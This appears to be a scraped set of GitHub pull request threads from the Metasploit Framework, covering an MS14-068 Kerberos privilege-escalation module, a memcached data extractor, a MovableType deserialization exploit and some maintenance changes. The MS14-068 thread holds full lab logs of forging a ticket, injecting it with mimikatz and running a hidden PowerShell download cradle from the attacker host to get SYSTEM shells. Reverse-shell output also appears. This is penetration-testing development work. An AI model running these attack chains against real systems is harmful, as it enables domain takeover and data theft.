Rex::Proto::Kerberos::CredentialCache::Cache .
Rex::Proto::Kerberos::Model::PreAuthPacRequest ...
Rex::Proto::Kerberos::Model::Authenticator .
Rex::Proto::Kerberos::Model::Checksum .
Rex::Proto::Kerberos::Model::KdcRequest ................
Rex::Proto::Kerberos::Pac::PrivSvrChecksum .
Rex::Proto::Kerberos::Model::KrbError ...............
Rex::Proto::Kerberos::Model::PreAuthEncTimeStamp ......
Rex::Proto::Kerberos::Model::KdcResponse ......
Rex::Proto::Kerberos::Model::Ticket ......
Rex::Proto::Kerberos::Model::PreAuthData ........

Finished in 0.1104 seconds
131 examples, 0 failures

Randomized with seed 51004
```

- [x] Install a vulnerable Windows domain using a Windows 2008 domain controller
- [x] Run the module against the DC to retrieve a TGT ticket exported in a MIT Credential cache format

```
msf > use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
msf auxiliary(ms14_068_kerberos_checksum) > set DOMAIN DEMO.LOCAL
DOMAIN => DEMO.LOCAL
msf auxiliary(ms14_068_kerberos_checksum) > set DOMAIN_SID S-1-5-21-1755879683-3641577184-3486455962
DOMAIN_SID => S-1-5-21-1755879683-3641577184-3486455962
msf auxiliary(ms14_068_kerberos_checksum) > set RHOST 172.16.158.135
RHOST => 172.16.158.135
msf auxiliary(ms14_068_kerberos_checksum) > set USER_SID 1000
USER_SID => 1000
msf auxiliary(ms14_068_kerberos_checksum) > set USER juan
USER => juan
msf auxiliary(ms14_068_kerberos_checksum) > set PASSWORD juan
PASSWORD => juan
msf auxiliary(ms14_068_kerberos_checksum) > run

[*] 172.16.158.135:88 - Connecting with the KDC...
[*] 172.16.158.135:88 - Sending AS-REQ...
[*] 172.16.158.135:88 - Parsing AS-REP...
[*] 172.16.158.135:88 - Sending TGS-REQ...
[+] 172.16.158.135:88 - Valid TGS-Response, extracting credentials...
[+] 172.16.158.135:88 - MIT Credential Cache saved on /Users/jvazquez/.msf4/loot/20141222175751_default_172.16.158.135_windows.kerberos_452461.bin
[*] Auxiliary module execution completed
```

- [x] Import the MIT Credential cache with Mimikatz, the meterpreter extension doesn't support MIT CC format atm, but it can be converted trivially with mimikatz. For testing purposes, you can use mimikatz directly on the target system to import the ticket from the MIT Cache Credential file:

```
kerberos::ptc ""20141222175751_default_172.16.158.135_windows.kerberos_452461.bin"" /export
Principal : (01) : juan ; @ DEMO.LOCAL

Data 0
           Start/End/MaxRenew: 12/23/2014 12:57:51 AM ; 12/23/2014 10:57:51 AM
 12/30/2014 12:57:51 AM
           Service Name (01) : krbtgt ; DEMO.LOCAL ; @ DEMO.LOCAL
           Target Name  (01) : krbtgt ; DEMO.LOCAL ; @ DEMO.LOCAL
           Client Name  (01) : juan ; @ DEMO.LOCAL
           Flags 00000000    :
           Session Key       : 0x00000017 - rc4_hmac_nt
             8cece387b84ca18a87a7b447f154fb71
           Ticket            : 0x00000000 - null              ; kvno = 2
[...]
           * Injecting ticket : OK
```

- [x] After importing the MIT Cache Credential feel free to test your new privileges. For example, connect to a shared resource only available for Domain Administrators from the target. 

Also you can get privileged sessions in the domain. Several methods have been already discussed (see module references). For example:

```
msf exploit(web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     172.16.158.1     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     8080             yes       The local port to listen on.
   SSL         false            no        Negotiate SSL for incoming connections
   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion  TLS1             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH     /                no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     172.16.158.1     yes       The listen address
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH


msf exploit(web_delivery) > exploit
[*] Exploit running as background job.

[*] Started reverse handler on 172.16.158.1:4445
msf exploit(web_delivery) > [*] Using URL: http://172.16.158.1:8080/
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.158.1:8080/'))

msf exploit(web_delivery) > sessions

Active sessions
===============

  Id  Type                   Information            Connection
  --  ----                   -----------            ----------
  1   meterpreter x86/win32  DEMO\juan @ EXPLOITER  172.16.158.1:4444 -> 172.16.158.131:64611 (172.16.158.131)

msf exploit(web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 1936 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\juan\Desktop>sc \\WIN-F46QAN3U3UH.demo.local\ create psh_test binPath= ""cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.158.1:8080/'))""
sc \\WIN-F46QAN3U3UH.demo.local\ create psh_test binPath= ""cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.158.1:8080/'))""
[SC] CreateService SUCCESS

C:\Users\juan\Desktop>sc \\WIN-F46QAN3U3UH.demo.local\ start psh_test
sc \\WIN-F46QAN3U3UH.demo.local\ start psh_test
^Z
Background channel 2? [y/N]  y
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 3220 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\juan\Desktop>
[*] 172.16.158.135   web_delivery - Delivering Payload
[*] Sending stage (770048 bytes) to 172.16.158.135


C:\Users\juan\Desktop>se^R


C:\Users\juan\Desktop>^Z
Background channel 3? [y/N]  y
[-] Error running command shell: ThreadError can't be called from trap context
meterpreter > sessions
[-] Unknown command: sessions.
meterpreter > background
[*] Backgrounding session 1...
msf exploit(web_delivery) > sessions

Active sessions
===============

  Id  Type                   Information                            Connection
  --  ----                   -----------                            ----------
  1   meterpreter x86/win32  DEMO\juan @ EXPLOITER                  172.16.158.1:4444 -> 172.16.158.131:64611 (172.16.158.131)
  2   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ WIN-F46QAN3U3UH  172.16.158.1:4445 -> 172.16.158.135:59025 (172.16.158.135)

msf exploit(web_delivery) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```","[""btw, I'll proceed with a lot more testing tomorrow, in case it could save some time on the testing / landing of this pull request! I'll paste my results here, probably modify if I find errors which stop ms14-068 module!"", ""Dang that's a lot of commits. One would think you've been working on this for a while. :)"", '@todb hehe :) one would think...\r\n\r\noka travis should be green now for 1.9.3... ruby versions.... :P', ""I'll have support soon for this format baked into kiwi!\n\nNice work Juan :)"", '@OJ it would be SUPER cool. I finally selected the MIT Cache Credentail as file format to because seemed more portable, since can be used from mimikatz and MIT kerberos. But having to convert it to use from kiwi in meterpreter is a little bit of a hassle :) Would be great to import the generated file from meterpreter directly!', 'wow impressive PR! Will do some testing later on :D', '@jvazquez-r7 without looking at it, there were many problems on the pykek implementation because of unsynced dates. The DC and the PC need to have the same time (or at least send the same time in the kerberos packets). Is this module also trying to get the server time and use it in the subsequent requests? (Pykek issue: https://github.com/bidord/pykek/issues/1) If not: Would be a cool feature :)', 'Works for me against 2008 using SMBClient :+1: ', 'Would be nice to be able to use current_user_psexec with this ala: https://github.com/rapid7/metasploit-framework/pull/4357\r\n\r\n', ""Nice work @jvazquez-r7 - got one suggestion, auto-uppercase the domain as it seems that's a requirement. But you might also tell the user you are doing so and output the domain in uppercase form. Might help stop questions that we'd get with this module.\r\n```\r\nRHOST => 172.16.102.15\r\nmsf auxiliary(ms14_068_kerberos_checksum) > run\r\n\r\n[*] 172.16.102.15:88 - Connecting with the KDC...\r\n[*] 172.16.102.15:88 - Sending AS-REQ...\r\n[-] 172.16.102.15:88 - Invalid AS-REP, aborting...\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(ms14_068_kerberos_checksum) > set DOMAIN EXPLOITS.LOCAL\r\nDOMAIN => EXPLOITS.LOCAL\r\nmsf auxiliary(ms14_068_kerberos_checksum) > run\r\n\r\n[*] 172.16.102.15:88 - Connecting with the KDC...\r\n[*] 172.16.102.15:88 - Sending AS-REQ...\r\n[*] 172.16.102.15:88 - Parsing AS-REP...\r\n[*] 172.16.102.15:88 - Sending TGS-REQ...\r\n[+] 172.16.102.15:88 - Valid TGS-Response, extracting credentials...\r\n[+] 172.16.102.15:88 - MIT Credential Cache saved on /home/mubix/.msf4/loot/20141223142927_default_172.16.102.15_windows.kerberos_291513.bin\r\n[*] Auxiliary module execution completed\r\n```"", 'Might want to add some verification of the user RID as well (or just pull it from the DC like @Meatballs1 said) because it still completes successfully with an incorrect RID\r\n```\r\nmsf auxiliary(ms14_068_kerberos_checksum) > run\r\n\r\n[*] 172.16.102.15:88 - Connecting with the KDC...\r\n[*] 172.16.102.15:88 - Sending AS-REQ...\r\n[*] 172.16.102.15:88 - Parsing AS-REP...\r\n[*] 172.16.102.15:88 - Sending TGS-REQ...\r\n[+] 172.16.102.15:88 - Valid TGS-Response, extracting credentials...\r\n[+] 172.16.102.15:88 - MIT Credential Cache saved on /Users/mubix/.msf4/loot/20141223142927_default_172.16.102.15_windows.kerberos_291513.bin\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(ms14_068_kerberos_checksum) > set USER_SID 9999\r\nUSER_SID => 9999\r\nmsf auxiliary(ms14_068_kerberos_checksum) > run\r\n\r\n[*] 172.16.102.15:88 - Connecting with the KDC...\r\n[*] 172.16.102.15:88 - Sending AS-REQ...\r\n[*] 172.16.102.15:88 - Parsing AS-REP...\r\n[*] 172.16.102.15:88 - Sending TGS-REQ...\r\n[+] 172.16.102.15:88 - Valid TGS-Response, extracting credentials...\r\n[+] 172.16.102.15:88 - MIT Credential Cache saved on /home/mubix/.msf4/loot/20141223143219_default_172.16.102.15_windows.kerberos_548112.bin\r\n[*] Auxiliary module execution completed\r\n```', ""Thanks everyone who took some time to check/test/comment! I'll be answering / fixing things later today :-)"", ""@FireFart, the logon_time (used to build the PAC) is extracted from the AS response. On my tests it's good enough. But if you mean the TGS response body times are important, it would need tweaking. It uses default times right now. \r\n\r\nBut the mixin and the model should be flexible enough to allow to provide new times easily :-) The current design tries to make easy to custom every field from modules! I'll dig into it and check if something needs to be tweaked! But please, let me add it as TODO atm. Thanks for pointing!"", ""@Meatballs1 and @mubix thanks very much for pointing the USER_SID vs USER_RID thing. Yeah I think both you are right. Worths to provide just an USER_SID  datastore option, and extract domain_sid/user_rid from there. Will work on it today.\r\n\r\n@mubix, yeah auto-uppercase the domain would help the user. I'll fix today it today."", ""@wchen-r7, some answers:\r\n\r\n* About the Exception things, you're right, there are more specific exceptions for some cases. As we already discussed today, I was trying to make easier to handle exceptions by just raising RuntimeError. I've opposite feelings about just raise RuntimeError vs more specific exceptions right now... I'll be rethink it (again) haha.\r\n\r\n* throwing Exception vs default return value on methods designed to ve overridden is a good idea I think. I'm going to fix it today. I need to decide what Exception to raise still ... (same decision than the point above).\r\n\r\n**EDIT**: decided to raise NotMethodError and NotImplementedError, definitely these case have more sense. Thanks for the feedback and discussion!\r\n\r\n* About the connect thing. It's not really needed, because send_request_as and send_request_tgs takes care of connecting as disconnecting (similar to the HttpClient) behavior. I'll delete that initial connect which maybe is a little bit confusing.\r\n\r\n* About the md5 calculation when RSA/MD5 is used, you're right. Rex::Text can be used directly :P Used OpenSSL becase I was using it for other tasks here. I'll switch to Rex::Text today.\r\n\r\n* About the check for nil on encoding methods, I think it would be a a lot of modifications, which would make the code harder to read/maintain. All those are private methods, and are just called by the encode public methods. Any check should be madre in these public methods I think. I think I've already tried to keep these checks (probably I forgot something). Example for the checksum and subkey fields on authenticator:\r\n\r\n```ruby\r\n\r\n          # Encodes the Rex::Proto::Kerberos::Model::Authenticator into an ASN.1 String\r\n          #\r\n          # @return [String]\r\n          def encode\r\n            elems = []\r\n            elems << OpenSSL::ASN1::ASN1Data.new([encode_vno], 0, :CONTEXT_SPECIFIC)\r\n            elems << OpenSSL::ASN1::ASN1Data.new([encode_crealm], 1, :CONTEXT_SPECIFIC)\r\n            elems << OpenSSL::ASN1::ASN1Data.new([encode_cname], 2, :CONTEXT_SPECIFIC)\r\n            elems << OpenSSL::ASN1::ASN1Data.new([encode_checksum], 3, :CONTEXT_SPECIFIC) if checksum\r\n            elems << OpenSSL::ASN1::ASN1Data.new([encode_cusec], 4, :CONTEXT_SPECIFIC)\r\n            elems << OpenSSL::ASN1::ASN1Data.new([encode_ctime], 5, :CONTEXT_SPECIFIC)\r\n            elems << OpenSSL::ASN1::ASN1Data.new([encode_subkey], 6, :CONTEXT_SPECIFIC) if subkey\r\n\r\n``` "", ""Okey, I think I've answered the comments, time to fix several things! thanks all for the review!"", 'Someone please land this once review and testing are done. Thanks!', '@wvu, yeah it will take a while. 82 files.', 'Blogged! No rush on landing, it should be right, but interested users should be able to merge and test now if they care to.\r\n\r\nhttps://community.rapid7.com/community/metasploit/blog/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit', ""I'll add some testing time when I get my ass back home in a few days."", ""Hey guys, if you make another TGS-REQ after the AP-REQ and first TGS-REQ, you can have a delegation, of delegation, TGT wich is valid... even from patched KDC point of view ;)\r\n\r\nOtherwise, the delegation TGT (from first TGS-REQ), is only valid from the unpatched KDC.\r\n\r\nIt's called, inception =) - http://fr.slideshare.net/gentilkiwi/mimikatz-how-to-push-microsoft-to-change-some-little-stuff/56 (\xc2\xa7 3)"", ""Are there any blockers left here? Just don't want to lose momentum due to Krampus attacks.\r\n"", ""Ok I'll jump in again."", 'Log:\r\n\r\nA failed attempt that\'s valid (due to a bad domain name):\r\n\r\n```\r\nmsf auxiliary(ms14_068_kerberos_checksum) > run\r\n\r\n[*] Validating options...\r\n[*] Using domain TEST...\r\n[*] 192.168.1.136:88 - Sending AS-REQ...\r\n[*] 192.168.1.136:88 - Parsing AS-REP...\r\n[*] 192.168.1.136:88 - Sending TGS-REQ...\r\n[!] 192.168.1.136:88 - KRB_AP_ERR_BADMATCH - Ticket and authenticator don\'t match\r\n[-] 192.168.1.136:88 - Invalid TGS-REP, aborting...\r\n[*] Auxiliary module execution completed\r\n```\r\n\r\nA successful attempt:\r\n\r\n```\r\nmsf auxiliary(ms14_068_kerberos_checksum) > run\r\n\r\n[*] Validating options...\r\n[*] Using domain TEST.WIN2K8...\r\n[*] 192.168.1.136:88 - Sending AS-REQ...\r\n[*] 192.168.1.136:88 - Parsing AS-REP...\r\n[*] 192.168.1.136:88 - Sending TGS-REQ...\r\n[+] 192.168.1.136:88 - Valid TGS-Response, extracting credentials...\r\n[+] 192.168.1.136:88 - MIT Credential Cache saved on /Users/sinn3r/.msf4/loot/20141229153803_default_192.168.1.136_windows.kerberos_480347.bin\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(ms14_068_kerberos_checksum) >\r\n```\r\n\r\nIn a separate terminal:\r\n\r\n```\r\n$ file /Users/sinn3r/.msf4/loot/20141229153803_default_192.168.1.136_windows.kerberos_480347.bin\r\n/Users/sinn3r/.msf4/loot/20141229153803_default_192.168.1.136_windows.kerberos_480347.bin: data\r\n```\r\n\r\n* Compiled mimikatz with VS 2013. Converted the format.\r\n\r\n```\r\nmeterpreter > load kiwi\r\nLoading extension kiwi...\r\n\r\n  .#####.   mimikatz 2.0 alpha (x86/win32) release ""Kiwi en C""\r\n .## ^ ##.\r\n ## / \\ ##  /* * *\r\n ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r\n \'## v ##\'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\r\n  \'#####\'    Ported to Metasploit by OJ Reeves `TheColonial` * * */\r\n\r\nsuccess.\r\nmeterpreter > kerberos_ticket_use /tmp/0-00000000-Administrator@krbtgt-TEST.WIN2K8.kirbi\r\n[*] Using Kerberos ticket stored in /tmp/0-00000000-Administrator@krbtgt-TEST.WIN2K8.kirbi, 1207 bytes\r\n[+] Kerberos ticket applied successfully\r\nmeterpreter >\r\n```\r\n\r\nEscalation:\r\n\r\n```\r\nmsf exploit(current_user_psexec) > run\r\n\r\n[*] Started reverse handler on 192.168.1.64:4444 \r\n[*] Using 192.168.1.136 as the internal address for victims to get the payload from\r\n[*] Creating share C:\\q5of1KGj\r\n[*] Dropping payload JLsNXqyT.exe\r\n[*] 192.168.1.136    Creating service AsIbzewUyB\r\n[*] 192.168.1.136    Starting the service\r\n[*] Sending stage (770048 bytes) to 192.168.1.136\r\n[*] 192.168.1.136    Deleting the service\r\n[*] Deleting share q5of1KGj\r\n[*] Deleting files C:\\q5of1KGj\r\n[*] Meterpreter session 2 opened (192.168.1.64:4444 -> 192.168.1.136:51984) at 2014-12-29 16:03:08 -0600\r\n\r\nmeterpreter > getpid\r\nCurrent pid: 2472\r\nmeterpreter > sysinfo\r\nComputer        : WIN-UNWF9AS3B65\r\nOS              : Windows 2008 (Build 6001, Service Pack 1).\r\nArchitecture    : x86\r\nSystem Language : en_US\r\nMeterpreter     : x86/win32\r\nmeterpreter > getuid\r\nServer username: NT AUTHORITY\\SYSTEM\r\nmeterpreter >\r\n```\r\n', 'Guys, did you consider to make a second TGS-REQ after this one to avoid error when used against a patched DC ?\r\nA second TGS-REQ with the first TGS (delegation TGT) will get a full valid delegation TGT...', ""@gentilkiwi thanks for the suggestion. I need to review/test your proposal. I did a fast check of the referenced slide and I wasn't sure if I was understanding correctly. You mean to make a second TGS-REQ against an **unpatched** KDC to get a tgt which should be valid even when used against **patched** KDC, am I understanding right? Definitely interesting to add, I need to find a little time to test and add the feature. Definitely interesting! btw, pull requests are super welcome :) . But I understand if you not interested in making pull request."", 'Whoo hoo thanks @wchen-r7!', '@gentilkiwi :+1: , sounds super useful.', 'Thanks, everyone!', ""@jvazquez-r7  & @todb-r7 right, it's exactly that =)\r\nit allows to detect patched DC too.""]"
542,rapid7/metasploit-framework,4596.0,"This new module helps with data extraction from an open memcached instance.  

Are squashed commits preferred? 

#### Verification steps 
- Setup a memcached instance locally 
- Fill memcached with sample data 
```
~$ telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
> set mykey 0 900 4
> data
STORED
> get mykey
VALUE mykey 0 4
data
END
> quit
Connection closed by foreign host.
```
- Run MS module to dump loot as shown below 
- Should see loot stored as key value pairs 
```
~$ head /home/paul/.msf4/loot/20150116094758_default_unknown_memcached.dump_292470.txt 
{""mykey""=>[""VALUE mykey 0 4\r\ndata\r\nEND\r\n""], 
```


#### Example msfconsole output 
![msf_output](https://cloud.githubusercontent.com/assets/9189901/5780684/6212038a-9d61-11e4-935f-a15db6d6baf9.png)

#### Example loot output 
![loot_output](https://cloud.githubusercontent.com/assets/9189901/5780787/2b89a178-9d62-11e4-9fc9-e211200c887a.png)

thanks for looking! 
","[""re: squashed commits, no, I don't think so.  I mean, sure, you can do whatever you like in your fork before the PR, but once you PR here others will have likely pulled your branch and squashing would rewrite history which is bad.  Also, IMO, I like to see the interim commits -- not everyone is perfect and nails the code 100% the first time, and sometimes it is helpful to see how the final result was achieved."", 'Definitely not necessary to get this landed, but it may make sense to put much of this code into Rex.  Generally, if something is interesting enough to write one scanner module there is probably at least another few modules out there that would be viable and could benefit from shared code in Rex.  Again, definitely not necessary.\r\n\r\nBut, on a related note, regardless of whether or not you think this should be in Rex, there is the other issue of potentially just using existing Ruby memcache client code rather than writing our own, which in turn brings up the issue of what memcached versions is this code as-is meant to support and how does it handle different formats?', 'Great yea we can definitely bring this into Rex, I think that would be useful.  I can work on that next. \r\n\r\nIt\'s possible the commands are different for really early versions of memcached so that would be problematic.  We could consider using https://github.com/mperham/dalli but their README says they support ""memcached 1.4+ only as it uses the newer binary protocol.""  So for really early versions we might borrow from http://www.rubydoc.info/gems/memcache-client but I haven\'t researched the different versions yet.  ', 'Landed -- I made one small change in 1cdcd3c to ensure that the data show in the table looks like it does in the loot.  \r\n\r\nValidation:\r\n\r\n```\r\nmsf auxiliary(memcached_extractor) > run\r\n\r\n[+] 10.4.21.44:11211 - Found 1 keys\r\n\r\nKeys/Values Found for 10.4.21.44:11211\r\n======================================\r\n\r\n Key    Value\r\n ---    -----\r\n mykey  ""VALUE mykey 0 4\\r\\nffaa\\r\\nEND\\r\\n""\r\n\r\n[+] 10.4.21.44:11211 - memcached loot stored at /home/jhart/.msf4/loot/20150122080329_m_10.4.21.44_memcached.dump_988358.txt\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(memcached_extractor) > services \r\n\r\nServices\r\n========\r\n\r\nhost        port   proto  name       state  info\r\n----        ----   -----  ----       -----  ----\r\n10.4.21.44  11211  tcp    memcached  open   1.4.13\r\n\r\nmsf auxiliary(memcached_extractor) > loot\r\n\r\nLoot\r\n====\r\n\r\nhost        service  type            name           content     info                 path\r\n----        -------  ----            ----           -------     ----                 ----\r\n10.4.21.44           memcached.dump  memcached.txt  text/plain  Memcached extractor  /home/jhart/.msf4/loot/20150122080329_m_10.4.21.44_memcached.dump_988358.txt\r\n```\r\n\r\nThanks for the contribution, @pdeardorff-r7!']"
543,rapid7/metasploit-framework,5042.0,"MSP-11934

Fixes a bug in #5036 where vulns were not getting created due to a typo (`session.assoc_exploit` -> `session.exploit`)

## Verification
- [ ] `multi/handler` reports its parent module, if any:
  - [ ] Get a session with `multi/handler`
  - [ ] **Verify** nothing explodes, `vulns` returns one vuln for ""Generic Payload Handler""
  - [ ] `set ParentModule exploit/windows/browser/ie_unsafe_scripting`
  - [ ] get another session
  - [ ] **Verify** nothing explodes, `vulns` returns one vuln for ie_unsafe_scripting
- [ ] Get a session with `ms08_067_netapi`
- [ ] **Verify** `vulns` shows a vuln for ""MS08-067 Microsoft Server Service Relative Path Stack Corruption""",[]
544,rapid7/metasploit-framework,5210.0,"This pull request renders markdown in module descriptions in the console. Titles, bolding and underline are rendered. Also, ""Yes"" and ""No"" are colorized ""green"" and ""red"" respectively.

# Validation Steps

- [ ] rake spec
- [ ] all should pass","[""If you're adding more than new specs for existing things or fixing a bug, verification steps should explain how to exercise your new feature."", ""@gmikeska-r7 You typo'd your branch name (`MSPMSP` vs `MSP`), so it didn't get linked automatically"", ""I have gone through all of this with jlee-r7. Let me know if there's anything else I need to work on here!"", ""@gmikeska-r7 Have you pushed all commits?  I don't see the changes in the spec here that I looked at with you."", 'I am pretty sure this will break things. Any non-msfconsole UI for example. Putting markdown into the module text field is going to throw a wrench into a lot of tools and web sites that display module descriptions today.', ""@gmikeska-r7 @jlee-r7 Markdown in descriptions breaks how just about every user interface parses these fields (as text). For example, we generally ignore line breaks in module text when displaying it in various user interfaces and web sites. Adding something like '### something\\nSomething else' is going to look just as bad as it just did."", 'Closing this for now, we can reopen if there is a reasonable approach to the user interface issues (unlikely given that many tools read the DB directly for this text)', 'Quick list of things this would break:\r\n* msfgui (Java)\r\n* Armitage (Java)\r\n* https://rapid7.com/db/\r\n* http://www.cvedetails.com/\r\n\r\nFormatting descriptions may be better off as a new field given the current reliance on treating the current field as text.', '@hmoore-r7 How is additional markdown formatting going to ""break"" any of those tools? Markdown is just text.', 'We could also have the description method strip out the formatting by default, if this is really a concern, and only render it properly in `msfconsole`. Not sure throwing away the work is the right call.', ""@mbuck-r7 Newlines have meaning in markdown, they don't have meaning in most of the the places we display the module.description field today. For example, HTML and after being whitespace scrubbed in the Java-based interfaces (armitage/msfgui). Using a newline-dependent markdown formatter (### for example) is going to look like line noise in all of these interfaces."", ""@mbuck-r7 That only works if we scrub it from the database as well, which means all interfaces that want to show markdown can't use the ModuleDetails version of this unless we save it into a new field."", 'For backwards compatibility, the default return value of mod.description and the default DB field would have to be preserved as text, which means a lot more work if we want to reopen this.', 'If the database saved a new field (.description_markdown) and the module had a new markdown method (.description_markdown) and the default .description was preserved, that could be a path forward.', '@mbuck-r7 Agree that the work is neat, just concerned we will get a flood of new MD-enabled modules that break rendering across all non-msfconsole/Pro interfaces.']"
545,rapid7/metasploit-framework,5147.0,"These modules target the deserialization of untrusted Storable data in
MovableType before 5.2.12 and 6.0.7.  The destructive version will
function on most CGI installations, but will leave the webapp corrupted.
The non-destructive version will only function on servers that have the
Object::MultiType (uncommon) and DateTime (common) Perl modules
installed in addition to MovableType.","[""A few other things:\r\n\r\n1. You don't really need to put the CVE in the file path. The search command should still be able to find it by CVE anyway.\r\n2. Same goes for the module name in the metadata. Here's our guideline on what to put in the name field: https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit#template\r\n3. It feels like you can merge the modules. Create a new datastore option allowing the user to decide if they want destructive or non-destructive. But I also understand why you're doing it this way, so..... thoughts, anybody?\r\n\r\nOther than that, I like the modules. They look pretty good."", ""@wchen-r7 I also like the two modules to be merged with a datastore option of ACTION (for example) defaulting to non-destructive. This way the user is automatically informed that there is a destructive way of executing the module as well. Currently if you don't know the other module exist, you have no idea."", ""Thanks for the feedback. I'll fix these issues and repush."", 'Pushed a new version with the two attack types merged into a single module.', '@lightsey As a part of another PR, hard coded timeout values in send_request_cgi should be avoided. Please take a look at https://github.com/rapid7/metasploit-framework/pull/5202 and see any file where timeout values are user configurable. ', 'Pushed a new version with the timeouts removed.', ""Pushed a new version to address jvazquez's concerns. Retested all functionality with MTOS 5.2.11."", 'Thanks @lightsey ! Awesome work! Thanks for the contribution, landed after minor cleanup, see final result here https://github.com/rapid7/metasploit-framework/commit/cb51bcc7769d2d9146b59518606b32b8b67b291a\r\n\r\nModule tested with both methods:\r\n\r\n```\r\nmsf exploit(sixapart_movabletype_storable_exec) > rexploit\r\n[*] Reloading module...\r\n\r\n[*] Started reverse double handler\r\n[*] 172.16.158.132:80 - Using nondestructive attack method\r\n[*] 172.16.158.132:80 - Sending payload (124 bytes)\r\n[*] Accepted the first client connection...\r\n[*] Accepted the second client connection...\r\n[*] Command: echo NnbNZDe5EPKxosTE;\r\n[*] Writing to socket A\r\n[*] Writing to socket B\r\n[*] Reading from sockets...\r\n[*] Reading from socket A\r\n[*] A: ""NnbNZDe5EPKxosTE\\r\\n""\r\n[*] Matching...\r\n[*] B is input...\r\n\r\nid\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\n^C\r\nAbort session 4? [y/N]  y\r\n\r\n[*] 172.16.158.132 - Command shell session 4 closed.  Reason: User exit\r\nmsf exploit(sixapart_movabletype_storable_exec) > show options\r\n\r\nModule options (exploit/unix/webapp/sixapart_movabletype_storable_exec):\r\n\r\n   Name         Current Setting  Required  Description\r\n   ----         ---------------  --------  -----------\r\n   DESTRUCTIVE  false            yes       Use destructive attack method (more likely to succeed, but corrupts target system.)\r\n   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOST        172.16.158.132   yes       The target address\r\n   RPORT        80               yes       The target port\r\n   TARGETURI    /cgi-bin/mt/     yes       MoveableType cgi-bin directory path\r\n   VHOST                         no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/unix/reverse):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST  172.16.158.1     yes       The listen address\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic\r\n\r\n\r\nmsf exploit(sixapart_movabletype_storable_exec) > set DESTRUCTIVE true\r\nDESTRUCTIVE => true\r\nmsf exploit(sixapart_movabletype_storable_exec) > rexploit\r\n[*] Reloading module...\r\n\r\n[*] Started reverse double handler\r\n[*] 172.16.158.132:80 - Using destructive attack method\r\n[*] 172.16.158.132:80 - Sending storable injection to unlink mt-config.cgi\r\n[*] Successfully sent unlink request\r\n[*] 172.16.158.132:80 - Rewriting mt-config.cgi to accept the payload\r\n[*] Successfully sent mt-config rewrite request\r\n[*] 172.16.158.132:80 - Sending payload request\r\n[*] Accepted the first client connection...\r\n[*] Accepted the second client connection...\r\n[*] Command: echo G1BA9KimRfCzSN2b;\r\n[*] Writing to socket A\r\n[*] Writing to socket B\r\n[*] Reading from sockets...\r\n[*] Reading from socket B\r\n[*] B: ""G1BA9KimRfCzSN2b\\r\\n""\r\n[*] Matching...\r\n[*] A is input...\r\n\r\nid\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\n^C\r\nAbort session 5? [y/N]  y\r\n\r\n[*] 172.16.158.132 - Command shell session 5 closed.  Reason: User exit\r\n```']"
546,rapid7/metasploit-framework,5312.0,"Edited modules/auxiliary/dos/http/ms15_034_ulonglongadd.rb first landed
in #5150, @wchen-r7's DOS module for CVE-2015-1635 HTTP.sys

Edited modules/auxiliary/gather/apple_safari_ftp_url_cookie_theft.rb
first landed in #5192, @joevennix's module for Safari CVE-2015-1126

Edited modules/auxiliary/gather/java_rmi_registry.rb first landed in

Edited modules/auxiliary/gather/ssllabs_scan.rb first landed in #5016,
add SSL Labs scanner

Edited modules/auxiliary/scanner/http/goahead_traversal.rb first landed
in #5101, Add Directory Traversal for GoAhead Web Server

Edited modules/auxiliary/scanner/http/owa_iis_internal_ip.rb first
landed in #5158, OWA internal IP disclosure scanner

Edited modules/auxiliary/scanner/http/wp_mobileedition_file_read.rb
first landed in #5159, WordPress Mobile Edition Plugin File Read Vuln

Edited modules/exploits/linux/http/multi_ncc_ping_exec.rb first landed
in #4924, @m-1-k-3's DLink CVE-2015-1187 exploit

Edited modules/exploits/unix/webapp/wp_slideshowgallery_upload.rb first
landed in #5131, WordPress Slideshow Upload

Edited modules/exploits/windows/local/run_as.rb first landed in #4649,
improve post/windows/manage/run_as and as an exploit

